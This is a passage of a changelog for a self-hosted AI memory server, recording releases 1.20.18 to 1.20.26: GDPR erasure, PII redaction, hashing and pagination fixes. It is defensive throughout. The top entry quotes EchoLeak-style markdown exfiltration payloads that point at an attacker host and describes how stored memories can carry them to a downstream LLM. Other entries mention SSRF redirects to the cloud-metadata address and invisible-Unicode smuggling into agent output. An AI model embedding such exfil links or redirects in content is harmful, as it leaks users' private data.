  EchoLeak / CVE-2025-32711 class): `![alt](url)` and `[text](url)` inside
  stored content are rewritten to plain text before reaching MCP/HTTP
  clients and the LLM consumers downstream — an image-pixel or tracking
  URL embedded in a memory can no longer ride out as a live link. Bare
  URLs in prose are intentionally left intact.
### Engineering record

- **`gate::strip_markdown_refs`** neutralizes the EchoLeak / CVE-2025-32711
class at the source. `sanitize_read` previously stripped invisible Unicode only;
  `![alt](http://attacker/pixel?ctx=...)` and `[t](https://evil)` rode verbatim
  through the seam into MCP/HTTP clients and onward to a markdown-rendering LLM
  consumer. The new forward-scan (regex-free, `char_indices` + the
  `mask_phone`-style byte walk) rewrites `![label](url)` → `[label]` and
  `[text](url)` → `text`. **Bare URLs in prose are intentionally left intact**
  (`see example.com` is not rewritten — false-positive trap). Composed into
  `sanitize_read` in the order redact → markdown → invisible-Unicode (strip
  markdown BEFORE invisible so a bidi-wrapped `]` can't defeat the bracket scan
  after invisible stripping). `sanitize_read_opt` inherits it via delegation.
  Storage stays verbatim (render-only, the `strip_invisible` storage rule).
  `+3 tests`.

**Honest ceilings:** deterministic text transform, NOT a markdown parser or URL
  reputation service; a non-markdown exfil vector ("visit attacker.com") survives
  (model-discipline / host-contract territory). The MCP binary inherits the strip
  transitively (its `tool_result_payload`/`format_response` compose through
  server handlers using `sanitize_read`). **Validation:** 44 gate tests pass,
  clippy + fmt clean.



## [1.20.26] — 2026-08-14

### Server — "Tourniquet" (SSRF egress paths closed)

Server `Cargo.toml`/lock 1.20.25 → 1.20.26; plugin unchanged. One shared client
  builder, two call-site swaps. No new endpoints, no new fields, no new deps. See
`IMPLEMENTATION_PLAN_v1.20.26_Tourniquet.md`. **ATLAS F-1 (High).**

### Release notes

- **Bug fixes:** **Chunk purge and GDPR erasure left knowledge-graph relationships and
  PII-named entity nodes behind** — a broken DELETE referenced a column that
  doesn't exist and silently aborted, so every purge leaked graph residue.
  Purges now sweep orphaned entities (shared ones survive) and erase
  review-queue proposals for the subject.
- **Bug fixes:** Read-path redaction/strip now covers **every emitted text field** (title,
  snippet, evidence text + headings on recall, search, and chunk fetches),
  closing the gap where some fields rode raw past the PII mask.
- **Improvements:** None beyond the fixes above.
- **Security fixes:** The outbound webhook client **no longer follows redirects** — a
  misconfigured webhook URL that 302s to a cloud-metadata or localhost
  address is no longer fetched (SSRF egress path closed).
- **Security fixes:** Audit and recall-trace hashes upgraded to **SHA-256** — low-entropy
  inputs (a name, an SSN, a short query) can no longer be recovered by
  brute-forcing the stored digest.
- **Security fixes:** The webhook signing-secret file now **fails closed** on group/world-
  readable permissions, matching the auth-token posture.
### Engineering record

Covers this release (Tourniquet) and the folded "Consolidate" changes that
ship in the same binaries.
- **`webhook::egress_client`** is the one outbound HTTP client now used by both
  webhook sinks (`alert.rs::sink` and `handlers/observe.rs::notify_art19`). Both
  previously built `reqwest::Client::new()`, which follows up to 10 redirects with
  no IP validation — so a misconfigured operator `BRAIN_*_WEBHOOK_URL` that 302s
  to `http://169.254.169.254/...` (cloud metadata) or `http://127.0.0.1:8765/...`
  (self) was followed. The new builder sets `.redirect(Policy::none())`, so a 3xx
  is surfaced to the caller, never fetched. URLs remain env-var-only (operator-
  controlled), so this is defense-in-depth, not a request-time fix. `+2 tests`
  (reuse the `TcpListener` 302-responder idiom from the existing Art-19 webhook
  test — no new dep).

**Honest ceilings:** does NOT resolve+validate host IPs against RFC1918 /
  loopback / link-local / `169.254.x` before the first request (the v2.x
  per-request resolver; DNS-rebinding across the connection-pool TTL remains the
  documented ceiling). Does NOT change body signing, retry policy, or add a URL
  allowlist. **Validation:** clippy clean; the two redirect tests are CI-runnable
  but unrunnable in this sandbox (network bind is blocked — the same restriction
  that already applies to the existing Art-19 webhook test); the
  `redirect::Policy::none()` call is reqwest's documented contract, type-verified
  by the build. (Doc note: the `--lib webhook` invocation in the plan reaches 0
  tests — `webhook` is binary-private; the correct command is `cargo test
  --features bench --bin brain-server -- egress_client`.)


### Server + client + plugin — "Consolidate" (the post-Sweep tail, closed)

Server `Cargo.toml`/lock + client 1.20.24 → 1.20.25; plugin 0.2.1 → 0.2.2 (a
real server+client+plugin release — the server changed). The v1.20.24 "Sweep"
declared the audit line closed, but that release itself left a coherent tail:
the **read path** (HTTP + graph residue) and the **erasure path** (proposals +
orphaned graph nodes) still had gaps, and the **hash upgrade** that shipped for
tombstones (G6) was never extended to the audit/trace `query_hash` family.
This release consolidates all of it — no new endpoints, no new fields. See
`IMPLEMENTATION_PLAN_v1.20.25_Consolidate.md`.

- **M1 — the audit/trace hash is now SHA-256, not xxh3-64** (`src/audit.rs`).
  `hash()` upgrades from the 16-hex `xxh3_64` fingerprint to a full 64-hex
  SHA-256. The audit + recall-trace paths were the one place G6's "deletion
  digests must not be offline-recoverable" never reached: `detail_hash`/
  `target_hash` and the stored `query_hash` derive from low-entropy inputs (an
  SSN, a name, a short recall query) that a fast non-cryptographic fingerprint
  would expose. `recall.rs`'s trace `query_hash` and `otel.rs::query_hash` now
  delegate to the same `audit::hash`; a stored digest no longer reveals its
  input. `+1 test` (`hash_is_sha256_not_xxh3`).
- **M2 — the read-path seam now covers every emitted text field**
  (`src/gate.rs` + `src/handlers/recall.rs` + `src/main.rs`). New
  `gate::sanitize_read` / `sanitize_read_opt` = `strip_invisible(redact_content(...))`
  — the v1.20.24 G1 Unicode strip composed with the G2 PII redaction — applied
  to **title, content, snippet, evidence.text and evidence.heading_path** on
  the recall/search hits (`results_to_hits`), and to **title + heading_path**
  on `GET /chunk/{id}` and `POST /chunk/multi-get` (content already redacted).
  Closes the gap where title/snippet/evidence rode raw past redaction and the
  HTTP JSON boundary emitted raw invisible bytes (bidi / zero-width / tag
  block). Idempotent — safe where clients re-strip. `+1 test`
  (`results_to_hits_strips_invisible_and_redacts_all_fields`).
- **M3 — DSAR erasure + chunk purge now erase the graph + review-queue residue**
  (`src/handlers/observe.rs` + `src/handlers/gate.rs`). The v1.20.24 purge's
  relationship-delete referenced `entities.knowledge_id` — a column that does
  **not** exist — so the subquery raised "no such column" and silently aborted
  the whole `DELETE`, leaving relationships (and the PII-bearing entity *names*
  they anchor) behind on every purge. The clause is removed; `purge_chunk_ids`
  now collects the affected entity ids from the chunk's relationships first and
  runs a post-loop orphan sweep (an entity whose relationships are all gone is
  erased; shared entities linked to surviving knowledge survive). The DSAR path
  (`run_dsar_pool`) additionally sweeps `proposals` by subject verbatim — raw
  candidate content with no owner column (possible PII about the subject) that
  previously survived a "complete" erasure. `+1 test`
  (`dsar_purge_erases_proposals_and_orphaned_entities`).
- **M4 — the webhook signing secret fails closed on wide modes**
  (`src/handlers/webhooks.rs`). A `webhook_secret_path` that isn't owner-only
  (`mode & 0o077 != 0`) is refused (`None`), matching the v1.20.24 G3 auth-token
  posture — a world-readable signing secret is a bearer capability any local
  user could use to forge signatures.
- **Tests:** server **534 passed / 5 ignored** in the main bin (+3: the audit
  SHA-256 shape, the all-fields read seam, the DSAR proposal+orphan-entity
  sweep — and the v1.20.24 G6 one-liner on the proposal-expired audit digest
  moves to `audit::hash`), MCP bin **15 passed** (unchanged), client **111
  passed** (unchanged), plugin (openclaw) **97 passed** (+1: the
  `memory_store` default-mode + direct-mode routing test). Both trees + plugin
  clippy `-D warnings` + fmt clean; server 5-binaries + client wasm release
  builds clean.
- **Honest ceilings:** M3's proposal sweep is a literal `LIKE %subject%`
  (proposals are operator-reviewed candidates, not subject-attributed rows —
  there is no owner join to be semantic about); the orphan-entity sweep is
  scoped to the purge's affected set and the "no remaining relationship" guard,
  so standalone entities unrelated to a purge are untouched by design; M1
  stores SHA-256 of a *hash input* that may itself be a pre-computed digest,
  and the stored form is a fingerprint, not a content *lease* — audit-chain
  verification is unchanged.

---



## [1.20.24] — 2026-08-13

### Server + client + plugin — "Sweep" (the audit gaps, closed)

Server `Cargo.toml`/lock + client 1.20.23 → 1.20.24. The v1.20.x harden line
was declared closed at v1.20.23, but the follow-up audit of that line left
seven unpaid gaps. This release closes all seven — **no new features, no new
endpoints**, only the missing enforcement, plus one genuine bug found by the
new regression tests. See `IMPLEMENTATION_PLAN_v1.20.24_Sweep.md`.

### Release notes

- **`/decayed` has returned an empty list since v1.14** regardless of actual
  expiry — a SQL type mismatch silently dropped every row. It now returns
  the decayed chunks it always should have.
- **Improvements:** The decay-review endpoint scans a narrow index instead of the full table.
- **Improvements:** The client bounds long raw-text blocks (source prompts, evidence) in a
  scroll box instead of wallpapering the approval view.
- **Security fixes:** Invisible-Unicode smuggling (bidi overrides, zero-width characters) is
  now stripped at every agent-facing output seam: MCP tool results, the CLI,
  the openclaw plugin, and the web client.
- **Security fixes:** PII masking now applies uniformly on **all** read paths (single-chunk
  fetch, multi-get, search, and the review queue), not only on recall —
  for non-admin principals.
- **Security fixes:** The server **refuses to start** when the auth-token file or JWT key is
  group/world-readable (a leaked-secret file can no longer silently
  authorize the API).
- **Security fixes:** GDPR subject erasure now covers **every domain database** (multi-domain
  deployments), not just the default one, and the deletion ledger carries
  an aggregate SHA-256 digest.
- **Security fixes:** Deletion digests are now SHA-256 instead of a fast 64-bit fingerprint,
  so they can no longer be brute-forced offline for low-entropy content
  (names, SSNs, short notes).
### Engineering record

- **G1 — every agent-facing seam strips invisible Unicode** (the v1.20.3
  `strip_invisible` class: C0/C1 controls, zero-width marks, bidi overrides/
  isolates). Now a shared lib module `src/strip_invisible.rs` (screen.rs
  re-exports it, so `crate::screen::*` paths are untouched), applied at the
  MCP tool-result envelope + `format_response` seam (`src/bin/mcp.rs`), the
  CLI `brain recall`/`brain get` prints (`src/bin/brain.rs`), and the openclaw
  plugin (`format.ts::sanitizeForBlock` now also strips `\u200B-\u200F`,
  `\u202A-\u202E`, `\u2066-\u2069`, `\uFEFF`; recall titles + graph tool
  outputs through the same boundary). Ponytail: strips *output* only — storage
  stays verbatim.
- **G7 — the client hardens the same seam** (`client/src/panels/`): strips at
  evidence-modal content, procedure-step content, graph names/relations,
  review + operation source prompts; the submit-form content columns get a
  bounded scroll box (`max-h-40 overflow-y-auto`) instead of a wallpaper of
  raw text — LITL smuggling was already screened server-side; this is the
  display fence so a text node can't spike the approval viewport.
- **G2 — PII read-path uniformity** (`redact_content`). Owner-only masking
  was applied at the v1.14 surface but not on every read path: `GET
  /chunk/{id}` and `POST /chunk/multi-get` now select + mask `pii` rows for
  non-admin principals, `POST /search` masks after the flagged-evidence
  suppression, and `GET /proposals` masks proposal content via the same
  read-time `scan_pii` leg. Reveal stays a separate, audited principal leg.
- **G3 — auth fails closed on a leaked secret file**. `AUTH_TOKEN_FILE` that
  exists with group/world bits (`mode & 0o077 != 0`) or that can't yield
  tokens with no `AUTH_TOKEN` env fallback now refuses to start
  (`config::auth_token_misconfigured` + `auth::check_secret_permissions`
  enforced on the token file and the JWT private key at startup). A valid env
  fallback keeps the ladder; the no-file loopback default is unchanged.
- **G4 — DSAR erases the subject from every domain DB, not just global**
  (`observe.rs::post_dsar`). Multi-db mode now runs a `run_dsar_pool` per
  domain (`registry.known_domains()`; shim mode = exactly the one `global`
  pool, byte-identical to v1.20.23), each in its own transaction (erasure-safe
  direction: a crash between pools erases-but-under-reports), the global pool
  last so its ledger row carries the whole purge: `aggregate_hash` = SHA-256
  of `{"subject", "domains":[...]}`. Dry-run unchanged (read-only footprint
  per pool).
- **G5 — `/decayed` scans narrowed, not full-table** (`gate.rs` +
  `migration.rs`): index-served superset WHERE (exact `expires_at < ?` +
  kind-policy branch at the *least* restrictive cutoff — min days — so no
  Rust-expired row is excluded; `page_decayed` stays the arbiter), served by
  new `idx_knowledge_expires_at` + `idx_knowledge_kind_created`.
- **G6 — deletion digests are not brute-forceable.** Purge tombstones now
  carry SHA-256 of the deleted content, not the row's 64-bit xxh3
  `content_hash` (offline-recoverable for low-entropy values); the DSAR
  ledger bundle hash is `sha256_hex` too. Knowledge-dedup `content_hash`
  stays xxh3 on purpose — that row still exists, so the hash is worthless.
- **Found bug — `/decayed` returned `[]` since v1.14.** The
  `strftime('%s', ...)` column is **TEXT**, so `get::<_, i64>` threw on
  every row and `.filter_map(|r| r.ok())` dropped them all — the endpoint
  has silently served an empty list regardless of expiry. The G5 regression
  test caught it (the fixture failed where any live-DB test would have);
  `unixepoch(...)` returns INTEGER with identical parsing.
- **Tests:** server **532 passed / 5 ignored** in the main bin (+5: the
  superset property on a real DB, purge-digest SHA-256, cross-domain purge +
  single-ledger, `check_secret_permissions` mode ladder, `auth_token_misconfigured`
  fail-closed ladder), MCP bin 15 (+2: envelope + response-seam strips);
  client **111 passed** (unchanged — the G7 fence is CSS-only); plugin
  (openclaw) **96 passed** (+2: bidi class + title strip). Both trees + plugin
  clippy `-D warnings` + fmt clean; server 5-binaries + client wasm release
  builds clean.
- **Honest ceilings:** the G3 checks are reader-side *enforcement* — a secret
  written with wide modes after start is still read by `install-service.sh`'s
  chmod contract; the G5 superset property holds for the `%Y-%m-%d
  %H:%M:%S` CURRENT_TIMESTAMP format (its only production shape); the G4
  aggregate is a digest of a domain *list*, not of per-domain bundle contents
  (bundles still hash individually at write time only); the cross-pool
  certificate is a best-effort audit record, not a crash-recovery protocol.

---



## [1.20.23] — 2026-08-13

### Server + client — "Calibrate" (reviewer calibration strip)

Server `Cargo.toml`/lock 1.20.22 → 1.20.23; client 1.20.22 → 1.20.23 (a real
release — the server changed). The human-in-the-loop essay's fourth condition
is **evaluative feedback to the reviewer**: a rubber-stamp gate is a false
control (Bainbridge's irony of automation). The raw signals already ship —
`created_at`/`edited_at`/`screen_verdict` on every `ProposalView`, and
`decided_at` written on approve/reject/expire since v1.14.0 — but `decided_at`
was **never selected into the view**, so no consumer could compute a
decision-latency. This release exposes it, adds a `since` window param, and
computes the four reviewer signals client-side — **no new telemetry, no new
server logic**, pure arithmetic over existing rows. See
`IMPLEMENTATION_PLAN_v1.20.23_Calibrate.md`.

### Release notes

- **Improvements:** The review queue now reports **when each proposal was decided** — the
  decision timestamp was recorded all along but never surfaced to clients.
- **Improvements:** `GET /proposals` accepts a `?since=` window parameter (e.g. last-30-days
  views) without changing the default response.
- **Improvements:** The client's Review panel shows a dismissable **reviewer calibration
  strip**: approval rate, median decision latency, edit rate, and
  screen-override rate, with a rubber-stamp warning when approvals exceed
  90% over 20+ decisions. Pure arithmetic over existing rows — no new
  telemetry.
### Engineering record

- **M1.1 — `ProposalView.decided_at`** (`src/handlers/gate.rs`). The
  `list_proposals` SELECT now carries `decided_at` (column 11, `Option<i64>`);
  `#[serde(default)]` on the field so legacy consumers are unaffected. The
  three write sites (`approve` :618 / `reject` :753 / TTL auto-expire :424)
  always stamped it; the read now surfaces it. Extracted `list_proposals_page`
  (the `page_decayed`/`list_dsar_page` idiom) so the projection is
  unit-testable with a bare `&Connection` — no HTTP stack, no model.
- **M1.2 — `since` window param.** `GET /proposals?status=&limit=` gains
  `?since=<unix ts>` — `WHERE status = ?1 AND created_at >= ?3` when present,
  byte-identical legacy query when absent. Parameterized (the repo's SQL
  discipline). A `since` window still stops at `LIMIT` (200), so the stats
  fetch passes `limit=200` explicitly or it samples only the 50 default.
- **M2 — client calibration core + strip** (`client/src/panels/review.rs`).
  Pure `Calibration` + `calibration_stats(approved, rejected)` — approve-rate,
  median decision latency (`decided_at - created_at`), edit-rate, and
  screen-override-rate (approved-with-`quarantine`-verdict), with zero
  denominators → `0.0`/`None` (no NaN). `ApiClient::proposals_since` fetches
  the two windowed pages at `limit=200`. A dismissable strip above the queue
  renders the four figures + a rubber-stamp warning (approve-rate > 0.9 over
  ≥ 20 decisions → `warn` tier + "review the last by hand"); fetch-failed →
  renders nothing (the v1.20.0 offline posture). `role="status"` +
  `aria-live="polite"` (WCAG). `cal_*` i18n keys in `en` only (de/fr/es/nl
  fall back).
- **Tests:** server +2 (main bin 525 → **527 passed** / 5 ignored):
  `proposal_view_round_trips_decided_at` (approved-set / pending-`None` /
  expired-set) + `proposals_since_filters_created_at_and_is_optional`; client
  +3 (**108 → 111 passed**): `calibration_stats_rates_and_median`,
  `calibration_stats_handles_empty_and_zero_denominators`,
  `rubber_stamp_warns_only_over_real_workload`. Both trees clippy `-D warnings`
  + fmt clean; wasm + all 5 server binaries build clean. `openapi.yaml`
  documents `ProposalView.decided_at` + the `since` param.
- **Honest ceilings:** the window is `since`-bounded **and** list-capped
  (LIMIT 200) — a 30-day window on a busy queue samples the newest 200, so the
  strip labels itself "last 200 decisions" when the cap is hit (a COUNT-aware
  window is v2.x). `override_rate` keys on the v1.20.3 read-time `screen_verdict`
  recomputation, not a stored decision-time verdict (a model swap re-badges
  in-flight rows). The strip is per-operator-global (all principals), not
  per-reviewer (RBAC breakdown is v2.3). The `warn` threshold (0.9 / 20) is a
  constant heuristic, not a reviewer baseline (v2.x cohort tooling).

### The v1.20.x hardening line — closure

v1.20.23 closed the v1.20 harden line. Every release turned an audit/essay gap
into a shipped, honest control — **Scrub** (v1.20.17, personal-data surface
scrub + inventory), **Bound** (v1.20.18, unbounded read paths), **Vault**
(v1.20.19, dead `pii_map` vault removed), **Replay** (v1.20.20, stored decision
path surfaced), **Subject360** (v1.20.21, DSAR dry-run footprint), **Clocks**
(v1.20.22, Art 17/12 deadline + retention visibility), and **Calibrate**
(v1.20.23, reviewer feedback). v1.20.24 "Sweep" ships after as the
**audit-followup on this closed line** (§[1.20.24] — the seven gaps the
post-calibration audit itemized, plus the `/decayed`-empty bug found by its
regression suite). Each implemented its audit gap with honest ceilings carried
to v2.x. See `IMPLEMENTATION_PLAN_v1.20_Hardening_Line_INDEX.md`.

---



## [1.20.22] — 2026-08-13
### Release notes

- **DSAR deadlines**: erasure responses now include the created date and a server-computed 30-day response deadline (configurable), matching the GDPR Article 17 window.
- **Improvements:** New admin endpoint lists the data-subject request ledger — status, timestamps, and a server-computed deadline per row — newest first and paginated.
- **Improvements:** The web client shows a live, color-coded 30-day countdown on each open erasure request in the Subjects panel.
- **Improvements:** The Data panel now lists the next items approaching retention expiry, with time-remaining labels.
### Engineering record


### Server + client — "Clocks" (DSAR deadline + retention expiry)

Server `Cargo.toml`/lock 1.20.21 → 1.20.22; client 1.20.21 → 1.20.22 (a real
release — the server changed). GDPR Art 17's 30-day window and Art 12's response
deadline are **commitments, not displays** — a controller that cannot show the
remaining window cannot show diligence. `dsar_requests` always stamped
`created_at`/`completed_at`; what was missing was the **visibility**: the DSAR
response carried no deadline, there was no ledger list endpoint, and the client
never rendered either clock. This release turns the v1.20.15 "queue is a clock"
core (reused unchanged) into the erasure + retention clocks. See
`IMPLEMENTATION_PLAN_v1.20.22_Clocks.md`.

- **M1.1 — `DsarResponse` deadline** (`src/handlers/observe.rs` +
  `src/config.rs`). Pure `dsar_deadline(created_at)` = `created_at +
  dsar_window_secs()`; `config` gains `DEFAULT_DSAR_WINDOW_DAYS = 30` (Art 17)
  + `BRAIN_DSAR_WINDOW_DAYS` override (the `BRAIN_PROPOSAL_TTL_SECS`
  resolution pattern). `DsarResponse` gains `created_at` + `deadline`
  (computed, the client's source of truth — the `expires_at`/`warn_secs`
  discipline). No schema change.
- **M1.2 — `GET /dsar` ledger list** (Admin). Bounded (`limit` default 100,
  clamped `1..=MAX_MULTI_GET`), newest-first (`ORDER BY id DESC`), the audit
  pagination idiom. `{ requests: [{id, subject, action, status, created_at,
  deadline, completed_at}], total }` — **`deadline` is server-computed on the
  rows**, so the client ticks against the same number the POST response carries
  (no client mirror of the window). Extracted `list_dsar_page` (the `page_decayed`
  idiom) so ordering + page boundary are unit-testable. Wired into the openapi
  route table + both route/guard guards.
- **M2.1 — Subjects panel: DSAR ledger + 30-day countdown** (`client`). Fetches
  `GET /dsar`; per open row the deadline clock runs through the v1.20.15
  `time_budget::{remaining, tier, format_remaining}` core (day-scale bands:
  `<3d` warn, `<1d` danger), re-rendered by one ~30s on-load ticker.
- **M2.2 — Data panel: next expiries** (`client`). Pure `next_expiries` core —
  sort by expiry, take 10, skip already-expired (the server excludes them
  anyway; the core is the boundary) — rendered with `format_remaining` labels,
  tier-colored.
- **Tests:** server +2 (main bin 523 → **525 passed** / 5 ignored); client +3
  (**105 → 108 passed**). Both trees clippy `-D warnings` + fmt clean; wasm +
  release builds clean.
- **Honest ceilings:** the countdown is a **signal, not enforcement** — the
  server never re-purges or re-reports autonomously (repo rule); the ledger TTL
  (v1.20.17) is the only automatic bound. The 30-day window is display math on
  `created_at`; the DB does not enforce it (a reminder/notification channel is
  v2.x). `GET /dsar` is an Admin-only operator registry (not subject-facing;
  DSARs keep flowing through POST + certificate). The `/decayed` endpoint only
  returns already-expired rows, so the Data "next to expire" card is the client
  boundary that would surface a near-expiry row if the server ever returned one.



## [1.20.21] — 2026-08-13
### Release notes

- **DSAR dry-run**: erasure requests accept a dry-run flag that reports exactly what would be deleted — root items, derived chunks, export rows, prior tombstones — and writes nothing.
- **Improvements:** The web client adds a "Preview DSAR footprint" card with an explicit "nothing deleted" note; previewing and erasing deliberately remain separate actions.
### Engineering record


### Server + client — "Subject360" (DSAR footprint preview)

Server `Cargo.toml`/lock 1.20.20 → 1.20.21; client 1.20.20 → 1.20.21 (a real
release — the server changed). Every DSAR was **execute-blind**: `POST /dsar`
located, exported, and purged in one irreversible shot, and a DPO could not
preview *what would be deleted* before clicking (GDPR Art 17 asks the
controller to be able to show the scope). This release adds a read-only
**dry-run**: the same locate engine, the same export-bundle builder, one
boolean between preview and erasure. See
`IMPLEMENTATION_PLAN_v1.20.21_Subject360.md`.

- **M1 — `dry_run` on `POST /dsar`** (`src/handlers/observe.rs`). The
  `DsarRequest` gains `#[serde(default)] dry_run: bool`; the `DsarResponse`
  gains `footprint` (skip-if-none). The handler runs locate + bundle build,
  then a `dry_run` branch reports the footprint and drops the read-only tx —
  no purge, no residue sweep, no ledger row, no certificate. `Footprint`
  carries `roots`/`derived`/`export_rows`/`tombstones` (prior deletions for
  this subject, matching the purge's `owner:<subject>` / `derived` reasons)/
  `dsar_rows` (ledger history)/`dry_run`. **No duplicated query**: the bundle
  builder is extracted once (`build_export_bundle`) and used by both paths.
- **M2 — footprint preview card** (`client/src/panels/subjects.rs` +
  `client/src/api.rs`). A "Preview DSAR footprint" card (subject input +
  button) issues `POST /dsar {subject, action: both, dry_run: true}` via
  `ApiClient::dsar_preview`, renders the counts with a `role="status"`
  "preview only — nothing deleted" note, and has **no** purge button (seeing
  and erasing stay one click apart). Pure parse core `parse_footprint` +
  `dsar_preview_body` pinned by wire tests. `dsar_preview_*` i18n keys in `en`
  only.

Tests: server +2 (`dsar_dry_run_footprint_counts_and_writes_nothing`,
`dsar_export_bundle_builder_matches_live_shape`), main bin 521 → 523 passed /
5 ignored; client +2 (`parse_footprint_reads_counts_and_dry_run_flag`,
`dsar_preview_request_carries_dry_run_true`), 103 → 105 passed. Both trees:
clippy `-D warnings` + fmt clean; server all 5 binaries + client wasm build
clean. `openapi.yaml` documents `dry_run`, the `Footprint` schema, and
`DsarResponse.footprint`. See `docs/AGENTS_HISTORY.md` Agent 88.

**Honest ceilings:** the footprint is a point-in-time preview (locate
semantics: owner + `derived_from` walk, depth 8) — not a full dependency
analysis of cross-domain knowledge (federation is v2.x). Ledger-history counts
reflect the v1.20.17 retention window, not all time. No parallel "what is *not*
deleted" report (backups snapshot posture is documented in COMPLIANCE.md). The
preview only calls the `knowledge`/`tombstones`/`dsar_requests` tables the live
path writes — no new schema.

---



## [1.20.20] — 2026-08-13
### Release notes

- **Improvements:** The web client's decision-replay view now shows the full stored decision path — decision, actor, domains searched, and the access scope applied.
- **Improvements:** Recall rows in the audit ledger deep-link to their decision replay.
- **Improvements:** The replay view can export the raw trace JSON as an evidence artifact.
- **Security fixes:** Replay rendering strips invisible Unicode (including bidi directional overrides) from every displayed string, closing a display-smuggling gap on the new surface.
### Engineering record


### Client — "Replay" (decision-path replay surface)

Client `Cargo.toml`/lock 1.20.16 → 1.20.20; server 1.20.19 → 1.20.20
(version-alignment only — **zero server code**, `openapi.yaml` untouched). The
decision path the server already stores (v1.15.0 "Observe" M2, `GET
/recall/{trace_id}/trace`) becomes a **routed, ledger-linked, exportable
evidence surface** — the Art 22 / ADMT "why this became memory, by what path"
story is one click from the audit chain. See
`IMPLEMENTATION_PLAN_v1.20.20_Replay.md`.

- **M1 — routed leaf is the structured replay view** (`client/src/panels/recall.rs`).
  `Route::RecallTrace` already delegates to `trace_panel`; the `TraceCard`
  renderer now reads the **stored** shape — `query_hash` (not `query`, v1.20.17
  M3), decision, actor, `domains_searched`, and the applied `scope` array — and
  runs every displayed string through the v1.20.3 `strip_invisible` render
  boundary (`replay_str`/`replay_list`), closing the bidi/zero-width smuggling
  class on the replay view.
- **M2 — audit ledger → replay deep link** (`client/src/panels/audit.rs`).
  `kind == "recall"` audit rows link to `/recall/{id}` (the row id *is* the trace
  id by construction), via pure `replay_href` — test-pinned so a future
  trace-capable kind is wired explicitly, never silently left unlinked.
- **M3 — evidence export + i18n**. The replay view downloads the raw trace JSON
  via the existing `document::eval` blob seam (no new helper). New `replay_*`
  keys in `en` only (de/fr/es/nl fall back per the `ops_title` convention):
  `replay_title` "Decision replay", `replay_audit_link` "open audit row",
  `replay_export` "export evidence". `RecallTrace` stays a detail route — the
  palette guard is unaffected.

Tests: +3 (`replay_href_links_only_recall_rows`, `replay_header_reads_stored_shape_and_strips`,
`replay_hit_cells_strip_smuggled_bidi`) — main client bin 100 → 103 passed.
Client clippy `-D warnings` + fmt + wasm build clean; server suite untouched
and green. See `docs/AGENTS_HISTORY.md` Agent 87.

**Honest note:** the replay view is read-only over what the trace recorded;
traces store the query **hash** (v1.20.17 M3), so the exact query is recovered
via audit + hash, not shown verbatim. Read-event traces remain opt-in +
sampled (JWT mode default), so the ledger link exists only where a trace row
exists. No screenshot/PDF export — the JSON is the honest evidence artifact.



## [1.20.19] — 2026-08-13
### Release notes

- **Improvements:** Export responses no longer include a PII-map key, and docs now describe the real privacy control: deterministic read-time redaction plus at-rest encryption.
- **Improvements:** A documented environment variable that had no runtime effect was removed from the documentation.
- **Security fixes:** The unused placeholder-to-raw-PII table is dropped during migration, erasing any legacy rows — no fetchable map from redacted placeholders back to raw personal data exists, by design.
### Engineering record


### Server — "Vault" (PII-vault promise made honest)

Server `Cargo.toml` 1.20.18 → 1.20.19; client stays at 1.20.16. The v1.14
`pii_map` write-time placeholder vault was **never built** — zero `INSERT INTO
pii_map` sites in-tree, only `/export`'s read path. A docs correction, not a
feature build: a `pii_map` holding raw PII in exchange for placeholders would
*increase* the personal-data surface, so the honest move is to stop advertising
it and erase the dead table. See `IMPLEMENTATION_PLAN_v1.20.19_Vault.md`.

- **M1 — `pii_map` read path removed** (`src/handlers/gate.rs`). `ExportQuery`
  drops `include_pii_map` (a request carrying `?include_pii_map=true` is simply
  ignored — serde drops the unknown field), the `pii_map` SELECT is gone, and
  the `/export` envelope no longer carries a `pii_map` key. `export_format_version`
  stays at 2.
- **M1.2 — real posture documented** (`src/gate.rs`, `src/handlers/observe.rs`).
  The shipped PII control is deterministic **output redaction**
  (`redact_content` + `screen_source_prompt`, default-on for read paths unless
  the caller holds `pii:read`/Admin) plus at-rest LUKS (v1.12.2). A fetchable
  placeholder→raw map is deliberately absent.
- **M1.3 + M1.4 — table dropped** (`src/migration.rs`). `DROP TABLE IF EXISTS
  pii_map` erases any legacy placeholder rows and the table at migration (the
  old `CREATE TABLE IF NOT EXISTS` was removed in the same release, so a fresh
  DB never recreates it). Schema version → 1.20.19
  (`SCHEMA_VERSION_V1_20_19`); guarded by `test_migration_schema_contract` +
  `migration_drops_pii_map_and_empty_table`.
- **M2 — configuration contract**. `BRAIN_REDACT_PII` had no `config.rs` getter
  (it was a documentation-only claim); removed from all live docs. `openapi.yaml`
  `/export` no longer documents `include_pii_map`/`pii_map`.

Tests: +2 (`export_has_no_pii_map_envelope`, `migration_drops_pii_map_and_empty_table`)
and the schema-contract test now asserts the table is *dropped*. All gates green:
clippy `-D warnings`, `fmt`, openapi/route/schema guards, release build.

**Honest note:** this is a *documentation correction* — the feature it retracts
was never shipped, so there is no behavior an operator relied on. See
`docs/AGENTS_HISTORY.md` Agent 86.



## [1.20.18] — 2026-08-13
### Release notes

- **Improvements:** Graph entity and relations endpoints now return a bounded page (default and max 500 edges) instead of every incident edge on hub entities.
- **Improvements:** The subject-conflict scan no longer cross-pairs the whole corpus — proposal writes are dramatically faster on large stores, with deterministic results.
- **Improvements:** The retention-expired listing endpoint is now paginated instead of returning every expired item at once.
- **Improvements:** A new index speeds up tombstone registry queries and erasure-certificate reads.
- **Security fixes:** Unbounded reads that could be forced to return corpus-sized responses (graph edges, expired items) are now capped, closing a denial-of-service surface.
### Engineering record


### Server — "Bound" (DoS + performance bounds)

Server `Cargo.toml` 1.20.17 → 1.20.18; client stays at 1.20.17. Closes the
remaining **unbounded read paths** and collapses the two **quadratic scans** the
v1.20.2 "Harden" D-group left: three read endpoints return bounded, stable pages
and `find_subject_conflicts` no longer cross-pairs every current chunk. One
schema change (a tombstone index), no new route. See
`IMPLEMENTATION_PLAN_v1.20.18_Bound.md`.

- **M1 — Graph endpoints return a finite edge set** (`src/main.rs`).
  `GET /graph/entity/{name}` and `GET /graph/relations` were returning *every*
  incident edge — on the live corpus (8732 docs / 21771 rels) a probe on a
  mega-hub was the same order as the corpus. Both now take a `?limit=`
  (default `MAX_GRAPH_EDGES` = 500, clamped `1..=500`) and run
  `ORDER BY r.id LIMIT ?` — a stable, reproducible page (the KG has no
  histogram to rank by, so a plain bound beats an arbitrary top-N). Shared
  `GraphLimit` query struct + `clamp_graph_limit` helper; extracted
  `entity_relations` / `relations_for` so the LIMIT contract is unit-tested.
- **M2 — `find_subject_conflicts` is no longer O(n²)** (`src/consolidate.rs`).
  The proposal-write conflict scan cross-paired *all* current chunks even
  though the rule only compares same-subject rows. Now grouped by subject
